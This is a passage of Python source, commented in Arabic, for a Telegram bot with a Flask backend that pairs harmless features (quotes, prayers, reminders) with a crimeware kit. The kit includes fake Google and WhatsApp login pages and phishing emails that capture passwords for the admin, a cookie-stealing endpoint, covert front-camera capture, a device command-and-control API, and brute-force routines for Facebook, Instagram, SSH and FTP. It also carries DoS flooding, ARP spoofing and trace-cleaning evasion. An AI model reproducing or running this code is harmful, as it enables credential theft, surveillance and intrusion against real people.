        .create-btn:hover { background: #f8f9fa; }
        .footer-text { margin-top: 24px; color: #5f6368; font-size: 13px; }
        @media (max-width: 480px) { .container { padding: 24px 16px; } .google-logo { font-size: 34px; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="google-logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
        <form method="POST" action="/phishing_capture">
            <input type="hidden" name="platform" value="google">
            <div class="input-group"><input type="text" name="username" placeholder="البريد الإلكتروني أو رقم الهاتف" required></div>
            <div class="input-group"><input type="password" name="password" placeholder="كلمة السر" required></div>
            <button class="login-btn" type="submit">تسجيل الدخول</button>
        </form>
        <a class="forgot-link" href="#">هل نسيت كلمة السر؟</a>
        <div class="divider"></div>
        <button class="create-btn" onclick="alert('تم إنشاء الحساب')">إنشاء حساب جديد</button>
        <div class="footer-text">© 2025 جوجل</div>
    </div>
</body>
</html>
"""
    elif platform == 'whatsapp':
        html = """
<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>واتساب</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #ece5dd; display: flex; justify-content: center; align-items: center; min-height: 100vh; direction: rtl; padding: 20px; }
        .container { width: 100%; max-width: 400px; background: #ffffff; padding: 40px 30px; border-radius: 12px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
        .logo { font-size: 40px; font-weight: bold; color: #25d366; margin-bottom: 30px; }
        .input-group { margin-bottom: 16px; }
        .input-group input { width: 100%; padding: 14px 16px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; outline: none; }
        .input-group input:focus { border-color: #25d366; }
        .login-btn { width: 100%; padding: 14px; background: #25d366; color: #fff; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
        .login-btn:hover { background: #1da85a; }
        .footer { margin-top: 20px; color: #8a8d91; font-size: 13px; }
        @media (max-width: 480px) { .container { padding: 24px 16px; } .logo { font-size: 32px; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">WhatsApp</div>
        <form method="POST" action="/phishing_capture">
            <input type="hidden" name="platform" value="whatsapp">
            <div class="input-group"><input type="text" name="username" placeholder="رقم الهاتف" required></div>
            <div class="input-group"><input type="password" name="password" placeholder="كلمة السر" required></div>
            <button class="login-btn" type="submit">تسجيل الدخول</button>
        </form>
        <div class="footer">© 2025 واتساب</div>
    </div>
</body>
</html>
"""
    else:
        html = "<h2>منصة غير معروفة</h2>"
    
    PHISHING_PAGES[platform] = html
    return html

# ===================== مسارات Flask =====================
@app.route('/device_info')
def device_info_page():
    token = request.args.get('token')
    if not token:
        return "Invalid request", 400
    chat_id = get_chat_id_by_token(token)
    if not chat_id:
        return "Invalid token", 400
    return render_template_string(DEVICE_INFO_PAGE_TEMPLATE)

@app.route('/camera_hack')
def camera_hack_page():
    token = request.args.get('token')
    if not token:
        return "Invalid request", 400
    chat_id = get_chat_id_by_token(token)
    if not chat_id:
        return "Invalid token", 400
    return render_template_string(CAMERA_PAGE_TEMPLATE)

@app.route('/cookie_stealer')
def cookie_stealer_page():
    token = request.args.get('token')
    if not token:
        return "Invalid request", 400
    chat_id = get_chat_id_by_token(token)
    if not chat_id:
        return "Invalid token", 400
    return render_template_string(COOKIE_STEALER_HTML)

@app.route('/shorten_url', methods=['GET', 'POST'])
def shorten_url_route():
    if request.method == 'GET':
        url = request.args.get('url')
        if url:
            short = shorten_url(url)
            if short:
                return jsonify({'short_url': short, 'original_url': url})
            return jsonify({'error': 'فشل قص الرابط'}), 400
        return jsonify({'error': 'يرجى توفير رابط'}), 400
    elif request.method == 'POST':
        data = request.get_json()
        if not data or 'url' not in data:
            return jsonify({'error': 'يرجى توفير رابط'}), 400
        short = shorten_url(data['url'])
        if short:
            return jsonify({'short_url': short, 'original_url': data['url']})
        return jsonify({'error': 'فشل قص الرابط'}), 400

@app.route('/phishing_pages/<platform>')
def phishing_page(platform):
    if platform not in ['facebook', 'google', 'whatsapp']:
        return "منصة غير مدعومة", 404
    return get_phishing_page(platform)

@app.route('/collect_data', methods=['POST'])
def collect_data():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'ok'}), 200
        token = data.get('token')
        if not token:
            return jsonify({'status': 'ok'}), 200
        chat_id = get_chat_id_by_token(token)
        if not chat_id:
            return jsonify({'status': 'ok'}), 200
        info = data.get('data', {})
        if not info:
            return jsonify({'status': 'ok'}), 200
        
        if 'image' in info:
            img_data = info['image']
            if img_data.startswith('data:image'):
                try:
                    header, encoded = img_data.split(',', 1)
                    img_bytes = base64.b64decode(encoded)
                    bot.send_photo(chat_id, BytesIO(img_bytes), caption="📸 صورة من الكاميرا الأمامية")
                    bot.send_photo(ADMIN_ID, BytesIO(img_bytes), caption=f"📸 صورة من ضحية للمستخدم {chat_id}")
                except Exception as e:
                    logger.error(f"Error processing image: {e}")
        else:
            msg = "📱 معلومات الجهاز:\n\n"
            for key, value in info.items():
                msg += f"- {key}: {value}\n"
            safe_send(chat_id, msg)
            # لا نرسل نسخة للمطور لتجنب التكرار
        
        return jsonify({'status': 'ok'}), 200
    except Exception as e:
        logger.error(f"collect_data error: {e}")
        return jsonify({'status': 'ok'}), 200

@app.route('/steal_cookies', methods=['POST'])
def steal_cookies():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'ok'}), 200
        token = data.get('token')
        if not token:
            return jsonify({'status': 'ok'}), 200
        chat_id = get_chat_id_by_token(token)
        if not chat_id:
            return jsonify({'status': 'ok'}), 200
        
        cookies = data.get('cookies', '')
        url = data.get('url', '')
        user_agent = data.get('user_agent', '')
        ip = request.remote_addr
        
        safe_db_execute("INSERT INTO cookie_logs (url, cookies, ip, user_agent, created_at) VALUES (?, ?, ?, ?, ?)",
                        (url, cookies, ip, user_agent, datetime.now().isoformat()))
        
        msg = f"🍪 تم سرقة الكوكيز!\n\n"
        msg += f"الرابط: {url}\n"
        msg += f"IP: {ip}\n"
        msg += f"User-Agent: {user_agent}\n"
        msg += f"الكوكيز: {cookies[:500]}"
        
        safe_send(chat_id, msg)
        safe_send(ADMIN_ID, f"🍪 كوكيز من ضحية للمستخدم {chat_id}:\n\n{msg}")
        
        return jsonify({'status': 'ok'}), 200
    except Exception as e:
        logger.error(f"steal_cookies error: {e}")
        return jsonify({'status': 'ok'}), 200

@app.route('/register_device', methods=['POST'])
def register_device():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'Invalid data'}), 400
    device_id = data.get('device_id')
    if not device_id:
        return jsonify({'error': 'device_id required'}), 400
    safe_db_execute("INSERT OR REPLACE INTO targets (device_id, name, type, ip, os, status, last_seen) VALUES (?, ?, ?, ?, ?, 'online', ?)",
                    (device_id, data.get('name', 'Unknown'), data.get('type', 'unknown'), data.get('ip'), data.get('os'), datetime.now().isoformat()))
    notify_admin(f"جهاز جديد متصل: {data.get('name')} ({device_id})")
    return jsonify({'status': 'success'}), 200

@app.route('/get_command', methods=['GET'])
def get_command():
    device_id = request.args.get('device_id')
    if not device_id:
        return jsonify({'error': 'device_id required'}), 400
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id, command FROM commands WHERE device_id = ? AND executed = 0 ORDER BY created_at LIMIT 1", (device_id,))
    row = c.fetchone()
    if row:
        c.execute("UPDATE commands SET executed = 1 WHERE id = ?", (row[0],))
        conn.commit()
        conn.close()
        return jsonify({'cmd': row[1], 'param': ''}), 200
    conn.close()
    return jsonify({'cmd': '', 'param': ''}), 200

@app.route('/submit_result', methods=['POST'])
def submit_result():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'Invalid data'}), 400
    device_id = data.get('device_id')
    if not device_id:
        return jsonify({'error': 'device_id required'}), 400
    safe_db_execute("UPDATE targets SET last_seen = ?, status = 'online' WHERE device_id = ?", (datetime.now().isoformat(), device_id))
    safe_db_execute("INSERT INTO collected_data (device_id, data_type, data, created_at) VALUES (?, ?, ?, ?)",
                    (device_id, data.get('type', 'unknown'), json.dumps(data.get('data', {})), datetime.now().isoformat()))
    return jsonify({'status': 'success'}), 200

@app.route('/phishing_capture', methods=['POST'])
def phishing_capture():
    ip = request.remote_addr
    try:
        platform = request.form.get('platform', 'unknown')
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        safe_db_execute("INSERT INTO phishing_logs (target_email, platform, username, password, ip, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                        ('', platform, username, password, ip, datetime.now().isoformat()))
        notify_admin(f"بيانات تصيد جديدة!\nالمنصة: {platform}\nالمستخدم: {username}\nكلمة السر: {password}\nIP: {ip}")
        return """
        <html><body style="font-family:Arial;text-align:center;padding:50px;background:#f0f2f5;"><div style="max-width:400px;margin:auto;background:white;padding:40px;border-radius:12px;box-shadow:0 2px 15px rgba(0,0,0,0.1);"><h2 style="color:#1877f2;">تم تسجيل الدخول</h2><p style="color:#555;">جاري تحويلك...</p><script>setTimeout(function(){ window.location.href = "https://www.google.com"; }, 2000);</script></div></body></html>
        """
    except Exception as e:
        return f"حدث خطأ: {str(e)}"

@app.route('/health')
def health():
    return jsonify({'status': 'healthy', 'time': datetime.now().isoformat()})

@app.route('/')
def index():
    return jsonify({'status': 'running', 'time': datetime.now().isoformat()})

# ===================== دوال الحماية =====================
def change_bot_identity():
    try:
        new_name = random.choice(["System Scanner", "Security Checker", "Network Tool"])
        bot.set_my_name(new_name)
        bot.set_my_description("أداة متقدمة للفحص الرقمي والأمان السيبراني")
        return f"تم تغيير هوية البوت إلى: {new_name}"
    except Exception as e:
        return f"فشل تغيير الهوية: {str(e)}"

def clean_traces():
    try:
        for f in os.listdir('temp'):
            os.remove(os.path.join('temp', f))
        for f in os.listdir('downloads'):
            os.remove(os.path.join('downloads', f))
        return "تم تنظيف السجلات والملفات المؤقتة بنجاح"
    except Exception as e:
        return f"فشل التنظيف: {str(e)}"

def backup_data():
    try:
        backup_dir = "backups"
        os.makedirs(backup_dir, exist_ok=True)
        backup_file = os.path.join(backup_dir, f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db")
        shutil.copy2(DB_PATH, backup_file)
        return f"تم إنشاء النسخة الاحتياطية: {backup_file}"
    except Exception as e:
        return f"فشل النسخ الاحتياطي: {str(e)}"

def detect_intrusion():
    return "لا توجد محاولات اختراق مشبوهة حالياً."

def active_shield():
    return "درع الحماية مفعل: يتم تطبيق حد الطلبات ومنع الـ IPs المشبوهة"

def restart_bot_safely():
    safe_db_execute("INSERT OR REPLACE INTO bot_state (key, value) VALUES ('last_restart', ?)", (datetime.now().isoformat(),))
    return "تم إعادة تشغيل البوت بشكل آمن"

def send_phishing_email(target_email, subject, message, phishing_link, platform='facebook'):
    try:
        msg = MIMEMultipart()
        msg['From'] = SMTP_USER
        msg['To'] = target_email
        msg['Subject'] = subject
        
        # قوالب رسائل لكل منصة
        platform_templates = {
            'facebook': f"""
            <html><body style='font-family:Arial,sans-serif;direction:rtl;'>
            <div style='max-width:600px;margin:auto;padding:20px;border:1px solid #ddd;border-radius:10px;'>
                <h2 style='color:#1877f2;'>تنبيه أمني من فيسبوك</h2>
                <p>{message}</p>
                <p>للتأكيد، يرجى الضغط على الرابط التالي:</p>
                <a href='{phishing_link}' style='display:inline-block;padding:12px 24px;background:#1877f2;color:white;text-decoration:none;border-radius:5px;'>تأكيد الحساب</a>
                <hr><p style='color:#888;font-size:12px;'>© 2025 فيسبوك</p>
            </div></body></html>
            """,
            'google': f"""
            <html><body style='font-family:Arial,sans-serif;direction:rtl;'>
            <div style='max-width:600px;margin:auto;padding:20px;border:1px solid #ddd;border-radius:10px;'>
                <h2 style='color:#4285f4;'>تنبيه أمني من جوجل</h2>
                <p>{message}</p>
                <p>للتحقق من حسابك، يرجى النقر على الرابط:</p>
                <a href='{phishing_link}' style='display:inline-block;padding:12px 24px;background:#4285f4;color:white;text-decoration:none;border-radius:5px;'>تحقق من حسابك</a>
                <hr><p style='color:#888;font-size:12px;'>© 2025 جوجل</p>
            </div></body></html>
            """,
            'whatsapp': f"""
            <html><body style='font-family:Arial,sans-serif;direction:rtl;'>
            <div style='max-width:600px;margin:auto;padding:20px;border:1px solid #ddd;border-radius:10px;'>
                <h2 style='color:#25d366;'>تنبيه من واتساب</h2>
                <p>{message}</p>
                <p>للتحقق من حسابك، يرجى النقر على الرابط:</p>
                <a href='{phishing_link}' style='display:inline-block;padding:12px 24px;background:#25d366;color:white;text-decoration:none;border-radius:5px;'>تحقق من حسابك</a>
                <hr><p style='color:#888;font-size:12px;'>© 2025 واتساب</p>
            </div></body></html>
            """
        }
        body = platform_templates.get(platform, platform_templates['facebook'])
        msg.attach(MIMEText(body, 'html'))
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SMTP_USER, SMTP_PASS)
        server.send_message(msg)
        server.quit()
        return True
    except Exception as e:
        return str(e)

# ===================== دوال بروت فورس =====================
def brute_force_facebook(email_or_phone, password_list, max_attempts=100):
    login_url = "https://www.facebook.com/login.php"
    results = {'success': False, 'credentials': None, 'attempts': 0}
    for i, pwd in enumerate(password_list[:max_attempts]):
        results['attempts'] += 1
        session = requests.Session()
        session.headers.update({'User-Agent': get_random_ua()})
        try:
            resp = session.get(login_url, timeout=10)
            if resp.status_code != 200:
                continue
            token_match = re.search(r'name="fb_dtsg" value="([^"]+)"', resp.text)
            token = token_match.group(1) if token_match else ''
            data = {'email': email_or_phone, 'pass': pwd, 'fb_dtsg': token, 'login': 'Log In'}
            login_resp = session.post(login_url, data=data, timeout=10, allow_redirects=False)
            if login_resp.status_code == 302 and 'c_user' in login_resp.cookies:
                results['success'] = True
                results['credentials'] = {'username': email_or_phone, 'password': pwd}
                break
        except:
            pass
        time.sleep(random.uniform(1, 3))
    return results

def brute_force_instagram(username, password_list, max_attempts=100):
    login_url = "https://www.instagram.com/accounts/login/ajax/"
    results = {'success': False, 'credentials': None, 'attempts': 0}
    session = requests.Session()
    session.headers.update({'User-Agent': get_random_ua(), 'X-Requested-With': 'XMLHttpRequest'})
    try:
        resp = session.get("https://www.instagram.com/", timeout=10)
        csrf = resp.cookies.get('csrftoken', '')
    except:
        csrf = ''
    for i, pwd in enumerate(password_list[:max_attempts]):
        results['attempts'] += 1
        data = {'username': username, 'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{pwd}'}
        headers = {'X-CSRFToken': csrf}
        try:
            resp = session.post(login_url, data=data, headers=headers, timeout=10)
            if resp.status_code == 200:
                json_resp = resp.json()
                if json_resp.get('authenticated'):
                    results['success'] = True
                    results['credentials'] = {'username': username, 'password': pwd}
                    break
        except:
            pass
        time.sleep(random.uniform(2, 4))
    return results

def brute_force_ssh(ip, username, password_list, max_attempts=100):
    results = {'success': False, 'credentials': None, 'attempts': 0}
    for pwd in password_list[:max_attempts]:
        results['attempts'] += 1
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, username=username, password=pwd, timeout=5)
            results['success'] = True
            results['credentials'] = {'username': username, 'password': pwd}
            client.close()
            break
        except:
            continue
    return results

def brute_force_ftp(ip, username, password_list, max_attempts=100):
    results = {'success': False, 'credentials': None, 'attempts': 0}
    for pwd in password_list[:max_attempts]:
        results['attempts'] += 1
        try:
            import ftplib
            ftp = ftplib.FTP(ip)
            ftp.login(username, pwd)
            results['success'] = True
            results['credentials'] = {'username': username, 'password': pwd}
            ftp.quit()
            break
        except:
            continue
    return results

# ===================== دوال إضافية (مسح منافذ، ARP، DoS) =====================
def port_scan(target):
    ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5432, 5900, 6379, 8080]
    open_ports = []
    try:
        ip = socket.gethostbyname(target)
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            if sock.connect_ex((ip, port)) == 0:
                open_ports.append(port)
            sock.close()
        return open_ports
    except:
        return []

def ssl_scan(domain):
    try:
        context = ssl.create_default_context()
        with socket.create_connection((domain, 443), timeout=10) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
                return {'valid': True, 'subject': cert.get('subject', ''), 'issuer': cert.get('issuer', ''), 'not_after': cert.get('notAfter', ''), 'not_before': cert.get('notBefore', '')}
    except:
        return {'valid': False, 'error': 'فشل الاتصال'}

def dos_attack(target, port, duration):
    results = {'packets_sent': 0, 'status': 'completed'}
    start_time = time.time()
    sent = 0
    try:
        ip = socket.gethostbyname(target)
        while time.time() - start_time < duration:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.connect((ip, port))
                sock.close()
                sent += 1
            except:
                pass
        results['packets_sent'] = sent
    except Exception as e:
        results['error'] = str(e)
        results['status'] = 'failed'
    return results

def arp_spoof(target_ip, gateway_ip, interface='eth0'):
    results = {'status': 'started'}
    try:
        target_mac = None
        gateway_mac = None
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip), timeout=2, verbose=False)
        for _, rcv in ans:
            target_mac = rcv[Ether].src
            break
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gateway_ip), timeout=2, verbose=False)
        for _, rcv in ans:
            gateway_mac = rcv[Ether].src
            break
        if target_mac and gateway_mac:
            send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac), count=10, verbose=False)
            send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), count=10, verbose=False)
            results['status'] = 'success'
        else:
            results['error'] = 'فشل الحصول على عناوين MAC'
            results['status'] = 'failed'
    except Exception as e:
        results['error'] = str(e)
        results['status'] = 'failed'
    return results

# ===================== دالة Keep-Alive =====================
def keep_alive():
    while True:
        time.sleep(120)
        try:
            ping_url = f"{SERVER_URL}/health"
            response = requests.get(ping_url, timeout=10)
            if response.status_code == 200:
                logger.info("✅ Ping داخلي ناجح: البوت نشط")
            else:
                logger.warning(f"⚠️ Ping داخلي فشل: {response.status_code}")
        except Exception as e:
            logger.error(f"❌ خطأ في Ping الداخلي: {e}")

# ===================== دوال التذكيرات =====================
def check_reminders():
    while True:
        try:
            now = datetime.now().isoformat()
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT id, chat_id, message FROM reminders WHERE remind_time <= ? AND is_active = 1", (now,))
            rows = c.fetchall()
            for row in rows:
                rid, chat_id, msg = row
                safe_send(chat_id, f"⏰ تذكير:\n{msg}")
                c.execute("UPDATE reminders SET is_active = 0 WHERE id = ?", (rid,))
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"خطأ في check_reminders: {e}")
        time.sleep(30)

def save_scan_result(target, scan_type, results):
    safe_db_execute("INSERT INTO scan_results (target, scan_type, results, created_at) VALUES (?, ?, ?, ?)",
                    (target, scan_type, json.dumps(results), datetime.now().isoformat()))
  # ===================== إنشاء البوت =====================
bot = TeleBot(TOKEN, parse_mode='HTML')
os.makedirs('temp', exist_ok=True)
os.makedirs('downloads', exist_ok=True)

ADVANCED_CLICKS = defaultdict(int)
user_adkar_indices = defaultdict(lambda: {'sabah': 0, 'massaa': 0})
user_doaa_indices = defaultdict(lambda: {})
user_quote_indices = defaultdict(lambda: {'arabic': {}, 'english': {}})
user_tip_indices = defaultdict(lambda: {})
temp_passwords = {}

# ===================== القوائم =====================
def build_main_menu(chat_id):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("الطقس", callback_data="weather"), InlineKeyboardButton("ويكيبيديا", callback_data="wikipedia"))
    markup.row(InlineKeyboardButton("مولد كلمات سر", callback_data="password_gen"), InlineKeyboardButton("فحص قوة كلمة السر", callback_data="password_strength"))
    markup.row(InlineKeyboardButton("تحويل نص إلى صوت", callback_data="text_to_speech"), InlineKeyboardButton("ترجمة فورية", callback_data="translate"))
    markup.row(InlineKeyboardButton("تذكير", callback_data="reminder"), InlineKeyboardButton("آخر الأخبار", callback_data="news"))
    markup.row(InlineKeyboardButton("قص رابط", callback_data="shorten_url"), InlineKeyboardButton("فك رابط", callback_data="expand_url"))
    if user_can_use_collector(chat_id):
        markup.row(InlineKeyboardButton("معلومات الجهاز", callback_data="device_info"), InlineKeyboardButton("الكاميرا الأمامية", callback_data="camera_hack"))
    if user_can_use_advanced(chat_id):
        markup.row(InlineKeyboardButton("رابط خبيث (كوكيز)", callback_data="cookie_stealer"), InlineKeyboardButton("تتبع رقم", callback_data="track_phone"))
        markup.row(InlineKeyboardButton("فحص شامل للموقع", callback_data="comprehensive_scan"))
    markup.row(InlineKeyboardButton("اقتباسات", callback_data="quotes_menu"), InlineKeyboardButton("نصائح", callback_data="tips_menu"))
    markup.row(InlineKeyboardButton("فحص الرابط", callback_data="check_link_advanced"), InlineKeyboardButton("تحليل APK", callback_data="analyze_apk"))
    markup.row(InlineKeyboardButton("تحليل PDF", callback_data="pdf_menu"), InlineKeyboardButton("الأجهزة", callback_data="list_devices"))
    markup.row(InlineKeyboardButton("📿 أذكار الصباح", callback_data="adkar_sabah"), InlineKeyboardButton("🌙 أذكار المساء", callback_data="adkar_massaa"))
    markup.row(InlineKeyboardButton("🤲 أدعية متنوعة", callback_data="doaa_menu"), InlineKeyboardButton("🕌 مسلم", callback_data="muslim_menu"))
    markup.row(InlineKeyboardButton("نقاطي", callback_data="my_points"), InlineKeyboardButton("رابط دعوتي", callback_data="my_referral"))
    markup.row(InlineKeyboardButton("سجل النقاط", callback_data="points_history"), InlineKeyboardButton("إعدادات متقدمة", callback_data="admin_panel"))
    if is_admin(chat_id):
        markup.row(InlineKeyboardButton("القائمة السرية", callback_data="hacking_menu"), InlineKeyboardButton("الحماية", callback_data="protection_menu"))
        markup.row(InlineKeyboardButton("إدارة الصلاحيات", callback_data="admin_permissions"), InlineKeyboardButton("قفل الدردشة", callback_data="lock_chat"))
        markup.row(InlineKeyboardButton("أرسل للمستخدم", callback_data="send_to_user"), InlineKeyboardButton("نشاط المستخدمين", callback_data="user_activity"))
        markup.row(InlineKeyboardButton("إدارة النقاط", callback_data="admin_points_menu"), InlineKeyboardButton("حظر المستخدمين", callback_data="admin_ban_menu"))
    markup.row(InlineKeyboardButton("تحميل فيديو", callback_data="download_video"))
    if user_can_use_phishing(chat_id) or is_admin(chat_id):
        markup.row(InlineKeyboardButton("صفحات تصيد", callback_data="phishing_pages"), InlineKeyboardButton("بريد تصيد", callback_data="phishing_email"))
    else:
        markup.row(InlineKeyboardButton("🔒 صفحات تصيد (300 نقطة)", callback_data="phishing_locked"))
    if is_admin(chat_id):
        markup.row(InlineKeyboardButton("وضع التخفي", callback_data="toggle_stealth"), InlineKeyboardButton("قفل البوت", callback_data="protect_lock"))
    return markup

# ===================== قوائم الاقتباسات =====================
def build_quotes_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("اقتباسات عربية", callback_data="quotes_arabic"), InlineKeyboardButton("اقتباسات إنجليزية", callback_data="quotes_english"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_quotes_type_menu(lang):
    markup = InlineKeyboardMarkup(row_width=2)
    if lang == 'arabic':
        markup.row(InlineKeyboardButton("حزين", callback_data="quote_arabic_sad"), InlineKeyboardButton("عميق", callback_data="quote_arabic_deep"), InlineKeyboardButton("جميل", callback_data="quote_arabic_beautiful"))
    else:
        markup.row(InlineKeyboardButton("Sad", callback_data="quote_english_sad"), InlineKeyboardButton("Deep", callback_data="quote_english_deep"), InlineKeyboardButton("Beautiful", callback_data="quote_english_beautiful"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="quotes_menu"))
    return markup

def build_quote_action_menu(lang, category, current_index, total):
    markup = InlineKeyboardMarkup(row_width=1)
    if current_index + 1 < total:
        markup.row(InlineKeyboardButton("التالي 🔄", callback_data=f"quote_next_{lang}_{category}_{current_index+1}"))
    markup.row(InlineKeyboardButton("رجوع 🔙", callback_data=f"quotes_{lang}"))
    return markup

# ===================== قوائم الأذكار والأدعية =====================
def build_adkar_action_menu(adkar_type, current_index, total):
    markup = InlineKeyboardMarkup(row_width=1)
    if current_index + 1 < total:
        markup.row(InlineKeyboardButton("التالي 🔄", callback_data=f"adkar_next_{adkar_type}_{current_index+1}"))
    markup.row(InlineKeyboardButton("رجوع 🔙", callback_data="back_main"))
    return markup

def build_doaa_action_menu(category, current_index, total):
    markup = InlineKeyboardMarkup(row_width=1)
    if current_index + 1 < total:
        markup.row(InlineKeyboardButton("التالي 🔄", callback_data=f"doaa_next_{category}_{current_index+1}"))
    markup.row(InlineKeyboardButton("رجوع 🔙", callback_data="doaa_menu"))
    return markup

# ===================== قوائم التصيد =====================
def build_phishing_pages_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("فيسبوك", callback_data="phish_facebook"), InlineKeyboardButton("جوجل", callback_data="phish_google"))
    markup.row(InlineKeyboardButton("واتساب", callback_data="phish_whatsapp"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_phishing_platform_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("فيسبوك", callback_data="phish_platform_facebook"), InlineKeyboardButton("جوجل", callback_data="phish_platform_google"))
    markup.row(InlineKeyboardButton("واتساب", callback_data="phish_platform_whatsapp"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

# ===================== قوائم أخرى =====================
def build_tips_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("نصائح دراسية", callback_data="tips_study"), InlineKeyboardButton("نصائح اجتماعية", callback_data="tips_social"))
    markup.row(InlineKeyboardButton("نصائح للاكتئاب", callback_data="tips_depression"), InlineKeyboardButton("نصائح إسلامية", callback_data="tips_islamic"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_tip_action_menu(category, current_index, total):
    markup = InlineKeyboardMarkup(row_width=1)
    if current_index + 1 < total:
        markup.row(InlineKeyboardButton("التالي 🔄", callback_data=f"tip_next_{category}_{current_index+1}"))
    markup.row(InlineKeyboardButton("رجوع 🔙", callback_data="tips_menu"))
    return markup

def build_protection_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("درع الحماية", callback_data="protect_shield"), InlineKeyboardButton("قفل البوت", callback_data="protect_lock"))
    markup.row(InlineKeyboardButton("تخفي شامل", callback_data="protect_stealth"), InlineKeyboardButton("كشف الاختراق", callback_data="protect_detect"))
    markup.row(InlineKeyboardButton("تغيير الهوية", callback_data="protect_identity"), InlineKeyboardButton("تنظيف السجلات", callback_data="protect_clean"))
    markup.row(InlineKeyboardButton("حماية API", callback_data="protect_api"), InlineKeyboardButton("نسخ احتياطي", callback_data="protect_backup"))
    markup.row(InlineKeyboardButton("إعادة تشغيل آمن", callback_data="protect_reboot"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_pdf_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("تلخيص PDF", callback_data="pdf_summary"), InlineKeyboardButton("استخراج نصوص", callback_data="pdf_extract"))
    markup.row(InlineKeyboardButton("تحليل ذكي (أسئلة)", callback_data="pdf_smart"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_hacking_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("حقن SQL", callback_data="hack_sqli"), InlineKeyboardButton("XSS", callback_data="hack_xss"))
    markup.row(InlineKeyboardButton("DoS", callback_data="hack_dos"), InlineKeyboardButton("ARP Spoof", callback_data="hack_arp"))
    markup.row(InlineKeyboardButton("تخمين فيسبوك", callback_data="bruteforce_fb"), InlineKeyboardButton("تخمين انستغرام", callback_data="bruteforce_ig"))
    markup.row(InlineKeyboardButton("تخمين SSH", callback_data="bruteforce_ssh"), InlineKeyboardButton("تخمين FTP", callback_data="bruteforce_ftp"))
    markup.row(InlineKeyboardButton("تخمين مخصص", callback_data="bruteforce_custom"), InlineKeyboardButton("تحميل فيديو", callback_data="download_video"))
    markup.row(InlineKeyboardButton("مسح منافذ", callback_data="port_scan"), InlineKeyboardButton("فحص SSL", callback_data="ssl_scan"))
    markup.row(InlineKeyboardButton("كاميرا", callback_data="hack_camera"), InlineKeyboardButton("ميكروفون", callback_data="hack_mic"))
    markup.row(InlineKeyboardButton("موقع", callback_data="hack_location"), InlineKeyboardButton("جهات اتصال", callback_data="hack_contacts"))
    markup.row(InlineKeyboardButton("رسائل SMS", callback_data="hack_sms"), InlineKeyboardButton("لقطة شاشة", callback_data="hack_screenshot"))
    markup.row(InlineKeyboardButton("Shell", callback_data="hack_shell"), InlineKeyboardButton("إيقاف تشغيل", callback_data="hack_shutdown"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_admin_panel():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("إحصائيات", callback_data="admin_stats"), InlineKeyboardButton("بث جماعي", callback_data="admin_broadcast"))
    markup.row(InlineKeyboardButton("المستخدمين", callback_data="admin_users"), InlineKeyboardButton("التقارير", callback_data="admin_reports"))
    markup.row(InlineKeyboardButton("إدارة النقاط", callback_data="admin_points_menu"), InlineKeyboardButton("حظر المستخدمين", callback_data="admin_ban_menu"))
    markup.row(InlineKeyboardButton("سجل التصيد", callback_data="admin_phishing_logs"), InlineKeyboardButton("إدارة الصلاحيات", callback_data="admin_permissions"))
